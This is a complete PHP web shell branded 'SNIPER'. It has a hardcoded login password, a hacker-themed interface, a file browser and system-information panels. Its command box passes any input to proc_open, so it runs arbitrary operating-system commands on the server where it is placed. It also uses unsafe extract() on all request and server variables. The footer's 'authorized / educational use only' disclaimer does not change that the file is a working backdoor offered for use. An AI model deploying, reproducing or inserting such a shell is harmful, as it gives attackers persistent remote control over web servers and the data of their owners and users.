<?php
session_start();

// ==================== CONFIG ====================
define('SHELL_NAME', 'SNIPER');
define('SHELL_VERSION', 'SNIPER v1.0');
define('AUTH_PASSWORD', 'sniper123'); // <-- apna password yahan change karo

// ==================== AUTH ====================
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === AUTH_PASSWORD) {
        $_SESSION['sniper_auth'] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Invalid password';
    }
}

if (empty($_SESSION['sniper_auth'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SNIPER | Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                background: #050505;
                font-family: 'Segoe UI', system-ui, sans-serif;
                color: #e0e0e0;
            }
            .login-box {
                background: #0d0d0d;
                border: 1px solid #ff0033;
                border-radius: 12px;
                padding: 40px 50px;
                width: 100%;
                max-width: 380px;
                box-shadow: 0 0 40px rgba(255, 0, 51, 0.15);
                text-align: center;
            }
            .logo {
                font-size: 2.8rem;
                font-weight: 800;
                letter-spacing: 6px;
                background: linear-gradient(90deg, #ff0033, #ff4d6d);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                margin-bottom: 8px;
            }
            .sub {
                color: #888;
                font-size: 0.85rem;
                margin-bottom: 30px;
                letter-spacing: 2px;
            }
            input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                background: #111;
                border: 1px solid #333;
                border-radius: 6px;
                color: #fff;
                font-size: 1rem;
                outline: none;
                margin-bottom: 16px;
            }
            input[type="password"]:focus {
                border-color: #ff0033;
            }
            button {
                width: 100%;
                padding: 14px;
                background: linear-gradient(90deg, #ff0033, #cc0029);
                border: none;
                border-radius: 6px;
                color: #fff;
                font-weight: 700;
                font-size: 1rem;
                cursor: pointer;
                letter-spacing: 1px;
            }
            button:hover { opacity: 0.9; }
            .error {
                color: #ff4d6d;
                font-size: 0.9rem;
                margin-bottom: 15px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">SNIPER</div>
            <div class="sub">SECURE TERMINAL ACCESS</div>
            <?php if (!empty($login_error)): ?>
                <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="password" name="login_password" placeholder="Enter Password" autofocus required>
                <button type="submit">AUTHENTICATE</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== SHELL LOGIC (original + small cleanups) ====================
define('PHPSHELL_VERSION', SHELL_VERSION);

if (ini_get('register_globals') != '1') {
    if (!empty($_POST)) extract($_POST);
    if (!empty($_GET)) extract($_GET);
    if (!empty($_SERVER)) extract($_SERVER);
}

$work_dir = !empty($work_dir) ? $work_dir : getcwd();

if (!empty($command) && preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $regs)) {
    $new_dir = $regs[1][0] == '/' ? $regs[1] : $work_dir . '/' . $regs[1];
    if (file_exists($new_dir) && is_dir($new_dir)) {
        $work_dir = $new_dir;
        chdir($work_dir);
    }
    unset($command);
} elseif (file_exists($work_dir) && is_dir($work_dir)) {
    chdir($work_dir);
}

$work_dir = getcwd();
$current_user = get_current_user();
$os_info = php_uname('s');
$php_version = phpversion();
$disk_total = @disk_total_space("/");
$disk_free = @disk_free_space("/");
$disk_used = $disk_total - $disk_free;
$disk_percent = $disk_total > 0 ? ($disk_used / $disk_total) * 100 : 0;
$memory_usage = memory_get_usage(true);
$memory_peak = memory_get_peak_usage(true);
$memory_percent = $memory_peak > 0 ? ($memory_usage / $memory_peak) * 100 : 0;
$cpu_load = function_exists('sys_getloadavg') ? sys_getloadavg() : [0, 0, 0];
$cpu_load_avg = $cpu_load[0];
$uptime = @file_exists('/proc/uptime') ? @file_get_contents('/proc/uptime') : null;
$uptime_sec = $uptime ? (float)explode(' ', $uptime)[0] : 0;

$items = @scandir($work_dir) ?: [];
$directories = [];
$files = [];
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = $work_dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($path)) {
        $directories[] = $item;
    } else {
        $files[] = $item;
    }
}

$output_content = "sniper:~$ Welcome to " . SHELL_VERSION . "\nSystem initialized. Type 'help' for available commands.\n\n";

if (!empty($command)) {
    $output_content .= "sniper:~$ " . htmlspecialchars($command) . "\n";

    if ($command === 'help') {
        $output_content .= "Available commands:\n";
        $output_content .= "  help     - Show this help\n";
        $output_content .= "  clear    - Clear terminal\n";
        $output_content .= "  date     - Show current date/time\n";
        $output_content .= "  whoami   - Show current user\n";
        $output_content .= "  pwd      - Show current directory\n";
        $output_content .= "  ls       - List directory contents\n";
        $output_content .= "  sysinfo  - Show system information\n\n";
    } elseif ($command === 'clear') {
        $output_content = "\n";
    } elseif ($command === 'date') {
        $output_content .= date('Y-m-d H:i:s') . "\n\n";
    } elseif ($command === 'whoami') {
        $output_content .= $current_user . "\n\n";
    } elseif ($command === 'pwd') {
        $output_content .= $work_dir . "\n\n";
    } elseif ($command === 'ls') {
        $output_content .= "Directories:\n";
        foreach ($directories as $dir) {
            $output_content .= "  [DIR]  " . $dir . "\n";
        }
        $output_content .= "\nFiles:\n";
        foreach ($files as $file) {
            $output_content .= "  [FILE] " . $file . "\n";
        }
        $output_content .= "\n";
    } elseif ($command === 'sysinfo') {
        $output_content .= "System Information:\n";
        $output_content .= "  OS            : " . $os_info . "\n";
        $output_content .= "  PHP Version   : " . $php_version . "\n";
        $output_content .= "  Current User  : " . $current_user . "\n";
        $output_content .= "  Current Dir   : " . $work_dir . "\n";
        $output_content .= "  CPU Load      : " . $cpu_load_avg . "\n\n";
    } else {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = @proc_open($command, $descriptorspec, $pipes, $work_dir);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $cmd_output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($cmd_output)) $output_content .= htmlspecialchars($cmd_output);
            if (!empty($errors)) $output_content .= "ERROR:\n" . htmlspecialchars($errors);
        } else {
            $output_content .= "Failed to execute command\n";
        }
        $output_content .= "\n";
    }
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function formatUptime($seconds) {
    $days = floor($seconds / 86400);
    $hours = floor(($seconds % 86400) / 3600);
    $mins = floor(($seconds % 3600) / 60);
    return "{$days}d {$hours}h {$mins}m";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNIPER | Interactive Terminal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #ff0033;
            --primary-dim: #cc0029;
            --accent: #ff4d6d;
            --cyan: #00e5ff;
            --dark: #0a0a0a;
            --darker: #050505;
            --card: #0f0f0f;
            --gray: #1a1a1a;
            --border: #2a2a2a;
            --text: #e8e8e8;
            --muted: #888;
            --success: #00e676;
            --warning: #ffab00;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--darker);
            color: var(--text);
            min-height: 100vh;
            padding: 16px;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background-attachment: fixed;
        }
        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background:
                radial-gradient(circle at 15% 20%, rgba(255, 0, 51, 0.08) 0%, transparent 25%),
                radial-gradient(circle at 85% 75%, rgba(0, 229, 255, 0.05) 0%, transparent 25%);
            z-index: -1;
            pointer-events: none;
        }
        .matrix-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: -2;
            opacity: 0.07;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        header {
            text-align: center;
            padding: 18px 0 12px;
            margin-bottom: 18px;
            position: relative;
        }
        .logo {
            font-size: 3.2rem;
            font-weight: 800;
            letter-spacing: 8px;
            background: linear-gradient(90deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 30px rgba(255, 0, 51, 0.3);
            display: inline-block;
            position: relative;
        }
        .logo::after {
            content: "_";
            color: var(--primary);
            animation: blink 1s infinite;
            position: absolute;
            right: -22px;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .subtitle {
            color: var(--muted);
            font-size: 0.95rem;
            letter-spacing: 3px;
            margin-top: 6px;
            text-transform: uppercase;
        }
        .top-bar {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 12px;
        }
        .logout-btn {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--muted);
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            text-decoration: none;
            transition: all 0.2s;
        }
        .logout-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
        }
        .grid-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-bottom: 20px;
        }
        @media (max-width: 992px) {
            .grid-container { grid-template-columns: 1fr; }
        }
        .card {
            background: rgba(15, 15, 15, 0.9);
            border-radius: 10px;
            padding: 22px;
            border: 1px solid var(--border);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
        }
        .card-full { grid-column: 1 / -1; }
        .card-title {
            color: var(--primary);
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1.25rem;
            font-weight: 600;
        }
        .path-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 14px;
            flex-wrap: wrap;
        }
        .current-path {
            background: var(--gray);
            padding: 11px 14px;
            border-radius: 6px;
            flex-grow: 1;
            min-width: 260px;
            border: 1px solid var(--border);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            white-space: nowrap;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            margin-top: 8px;
        }
        .breadcrumb a {
            color: var(--cyan);
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.85rem;
            transition: background 0.2s;
        }
        .breadcrumb a:hover { background: rgba(0, 229, 255, 0.1); }
        .directory-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 12px;
            margin-top: 16px;
            max-height: 320px;
            overflow-y: auto;
        }
        .directory-item {
            background: var(--gray);
            border-radius: 8px;
            padding: 14px 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        .directory-item:hover {
            transform: translateY(-3px);
            border-color: var(--primary);
            box-shadow: 0 4px 12px rgba(255, 0, 51, 0.15);
        }
        .directory-item.folder { color: var(--cyan); }
        .directory-item.file { color: var(--warning); }
        .directory-item i {
            font-size: 1.6rem;
            margin-bottom: 8px;
            display: block;
        }
        .directory-item .name {
            font-size: 0.8rem;
            word-break: break-all;
        }
        .directory-select {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 14px;
        }
        select, input[type="text"], button {
            padding: 11px 14px;
            border-radius: 6px;
            border: none;
            background: var(--gray);
            color: var(--text);
            font-size: 0.95rem;
            outline: none;
        }
        select {
            flex-grow: 1;
            min-width: 220px;
            border: 1px solid var(--border);
        }
        input[type="text"] {
            flex-grow: 1;
            min-width: 220px;
            border: 1px solid var(--border);
        }
        input[type="text"]:focus { border-color: var(--primary); }
        button {
            background: linear-gradient(90deg, var(--primary), var(--primary-dim));
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            border: 1px solid rgba(255, 0, 51, 0.4);
            transition: all 0.2s;
        }
        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 14px rgba(255, 0, 51, 0.3);
        }
        .command-section {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 14px;
        }
        .output-container { margin-top: 16px; position: relative; }
        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .terminal-header h3 { font-size: 1rem; color: var(--muted); }
        .controls { display: flex; gap: 8px; }
        .btn-small {
            padding: 6px 12px;
            font-size: 0.8rem;
            background: var(--gray);
            border: 1px solid var(--border);
        }
        .btn-small:hover {
            border-color: var(--primary);
            color: var(--primary);
            background: var(--gray);
            box-shadow: none;
            transform: none;
        }
        textarea {
            width: 100%;
            min-height: 280px;
            background: #080808;
            color: var(--success);
            padding: 16px;
            border-radius: 6px;
            border: 1px solid var(--border);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            resize: vertical;
            white-space: pre;
            overflow-x: auto;
            line-height: 1.45;
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.45);
            padding: 10px 14px;
            border-radius: 6px;
            margin-top: 12px;
            font-size: 0.85rem;
            border: 1px solid var(--border);
            flex-wrap: wrap;
            gap: 10px;
        }
        .connection-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .indicator {
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: var(--success);
            box-shadow: 0 0 8px var(--success);
        }
        .system-info { display: flex; gap: 18px; flex-wrap: wrap; }
        .info-item {
            display: flex;
            align-items: center;
            gap: 6px;
            color: var(--muted);
        }
        .progress-container { margin-top: 12px; }
        .progress-bar {
            height: 8px;
            background: #222;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 6px;
        }
        .progress-fill { height: 100%; border-radius: 4px; }
        .stat-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 14px;
        }
        .stat-card {
            background: rgba(20, 20, 20, 0.7);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px;
        }
        .stat-card h3 {
            font-size: 0.95rem;
            color: var(--muted);
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .stat-value {
            font-size: 1.6rem;
            font-weight: 700;
            color: var(--cyan);
        }
        footer {
            text-align: center;
            padding: 18px;
            color: #555;
            font-size: 0.8rem;
            margin-top: 10px;
        }
        @media (max-width: 768px) {
            .logo { font-size: 2.2rem; letter-spacing: 4px; }
            .path-container, .directory-select, .command-section { flex-direction: column; }
            select, input[type="text"], button { width: 100%; }
            .card { padding: 16px; }
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrixCanvas"></canvas>

    <div class="container">
        <div class="top-bar">
            <a href="?logout=1" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </div>

        <header>
            <div class="logo">SNIPER</div>
            <div class="subtitle"><?php echo SHELL_VERSION; ?> · Advanced Terminal Interface</div>
        </header>

        <div class="grid-container">
            <!-- File Explorer -->
            <div class="card">
                <h2 class="card-title"><i class="fas fa-folder-open"></i> File Explorer</h2>

                <div class="path-container">
                    <strong style="color:var(--muted);font-size:0.9rem;">Path</strong>
                    <div class="current-path"><?php echo htmlspecialchars($work_dir); ?></div>
                </div>

                <div class="path-container">
                    <div class="breadcrumb">
                        <?php
                        $path_parts = explode('/', trim($work_dir, '/'));
                        $path_accum = '';
                        echo '<a href="#" onclick="changeDir(\'/\')">Root</a>';
                        foreach ($path_parts as $part) {
                            if ($part === '') continue;
                            $path_accum .= '/' . $part;
                            echo '<span style="color:#444">/</span><a href="#" onclick="changeDir(\'' . htmlspecialchars($path_accum) . '\')">' . htmlspecialchars($part) . '</a>';
                        }
                        ?>
                    </div>
                </div>

                <div class="directory-select">
                    <select id="dirSelect">
                        <?php
                        $dirs = array_filter(glob('*') ?: [], 'is_dir');
                        array_unshift($dirs, '.');
                        if ($work_dir !== '/') array_unshift($dirs, '..');
                        foreach ($dirs as $dir) {
                            $selected = ($dir === '.') ? 'selected' : '';
                            $dir_path = ($dir === '.') ? $work_dir : (($dir === '..') ? dirname($work_dir) : $work_dir . '/' . $dir);
                            echo '<option value="' . htmlspecialchars($dir_path) . '" ' . $selected . '>' . htmlspecialchars($dir) . '</option>';
                        }
                        ?>
                    </select>
                    <button type="button" onclick="handleDirChange()"><i class="fas fa-sync-alt"></i> Go</button>
                </div>

                <div class="directory-grid" id="directoryGrid">
                    <?php foreach ($directories as $dir): ?>
                    <div class="directory-item folder" onclick="changeDir('<?php echo htmlspecialchars($work_dir . DIRECTORY_SEPARATOR . $dir); ?>')">
                        <i class="fas fa-folder"></i>
                        <div class="name"><?php echo htmlspecialchars($dir); ?></div>
                    </div>
                    <?php endforeach; ?>
                    <?php foreach ($files as $file): ?>
                    <div class="directory-item file">
                        <i class="fas fa-file"></i>
                        <div class="name"><?php echo htmlspecialchars($file); ?></div>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- Command Center -->
            <div class="card">
                <h2 class="card-title"><i class="fas fa-terminal"></i> Command Center</h2>

                <form id="commandForm" method="get">
                    <input type="hidden" name="work_dir" id="workDirInput" value="<?php echo htmlspecialchars($work_dir); ?>">
                    <div class="command-section">
                        <input type="text" id="commandInput" name="command" placeholder="Enter command..." autocomplete="off" autofocus>
                        <button type="submit"><i class="fas fa-bolt"></i> Execute</button>
                    </div>
                </form>

                <div class="output-container">
                    <div class="terminal-header">
                        <h3>Terminal Output</h3>
                        <div class="controls">
                            <button type="button" class="btn-small" onclick="clearOutput()"><i class="fas fa-trash-alt"></i> Clear</button>
                            <button type="button" class="btn-small" onclick="copyOutput()"><i class="fas fa-copy"></i> Copy</button>
                            <button type="button" class="btn-small" onclick="downloadOutput()"><i class="fas fa-download"></i> Save</button>
                        </div>
                    </div>
                    <textarea id="output" readonly><?php echo $output_content; ?></textarea>
                </div>

                <div class="status-bar">
                    <div class="connection-indicator">
                        <div class="indicator"></div>
                        <span>Connected · <?php
                            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
                            echo htmlspecialchars($host);
                        ?></span>
                    </div>
                    <div class="system-info">
                        <div class="info-item"><i class="fas fa-microchip"></i> PHP <?php echo $php_version; ?></div>
                        <div class="info-item"><i class="fas fa-server"></i> <?php echo htmlspecialchars($os_info); ?></div>
                        <div class="info-item"><i class="fas fa-clock"></i> <span id="clock"></span></div>
                    </div>
                </div>
            </div>

            <!-- System Overview (improved) -->
            <div class="card card-full">
                <h2 class="card-title"><i class="fas fa-chart-bar"></i> System Overview</h2>
                <div class="stat-grid">
                    <div class="stat-card">
                        <h3><i class="fas fa-memory"></i> Memory</h3>
                        <div style="display:flex;justify-content:space-between;font-size:0.85rem;color:var(--muted);margin-bottom:4px;">
                            <span><?php echo formatBytes($memory_usage); ?> used</span>
                            <span><?php echo formatBytes($memory_peak); ?> peak</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width:<?php echo min(100, round($memory_percent)); ?>%;background:linear-gradient(90deg,var(--primary),var(--accent));"></div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-hdd"></i> Disk</h3>
                        <div style="display:flex;justify-content:space-between;font-size:0.85rem;color:var(--muted);margin-bottom:4px;">
                            <span><?php echo formatBytes($disk_used); ?> used</span>
                            <span><?php echo formatBytes($disk_total); ?> total</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width:<?php echo min(100, round($disk_percent)); ?>%;background:linear-gradient(90deg,var(--warning),#ff6d00);"></div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-microchip"></i> CPU Load</h3>
                        <div class="stat-value"><?php echo number_format($cpu_load_avg, 2); ?></div>
                        <div style="font-size:0.8rem;color:var(--muted);margin-top:4px;">1-min average</div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-hourglass-half"></i> Uptime</h3>
                        <div class="stat-value" style="font-size:1.3rem;">
                            <?php echo $uptime_sec > 0 ? formatUptime($uptime_sec) : 'N/A'; ?>
                        </div>
                        <div style="font-size:0.8rem;color:var(--muted);margin-top:4px;">Server uptime</div>
                    </div>
                </div>
            </div>
        </div>

        <footer>
            <p>SNIPER Terminal · For authorized / educational use only</p>
        </footer>
    </div>

    <script>
        // Matrix rain
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array.from({ length: columns }, () => Math.floor(Math.random() * canvas.height / fontSize));

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#ff0033';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 40);

        function updateClock() {
            document.getElementById('clock').textContent = new Date().toLocaleTimeString();
        }
        setInterval(updateClock, 1000);
        updateClock();

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        document.getElementById('commandInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') document.getElementById('commandForm').submit();
        });

        function changeDir(path) {
            document.getElementById('workDirInput').value = path;
            document.getElementById('commandForm').submit();
        }
        function handleDirChange() {
            const select = document.getElementById('dirSelect');
            changeDir(select.options[select.selectedIndex].value);
        }

        // Improved buttons
        function clearOutput() {
            document.getElementById('output').value = '';
        }
        function copyOutput() {
            const ta = document.getElementById('output');
            ta.select();
            ta.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(ta.value).then(() => {
                const btn = event.currentTarget;
                const old = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copied';
                setTimeout(() => btn.innerHTML = old, 1500);
            }).catch(() => {
                document.execCommand('copy');
            });
        }
        function downloadOutput() {
            const output = document.getElementById('output').value;
            const blob = new Blob([output], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'sniper_output_' + new Date().toISOString().slice(0,19).replace(/[:T]/g,'-') + '.txt';
            document.body.appendChild(a);
            a.click();
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 100);
        }

        // Auto scroll terminal
        const ta = document.getElementById('output');
        ta.scrollTop = ta.scrollHeight;
    </script>
</body>
</html>
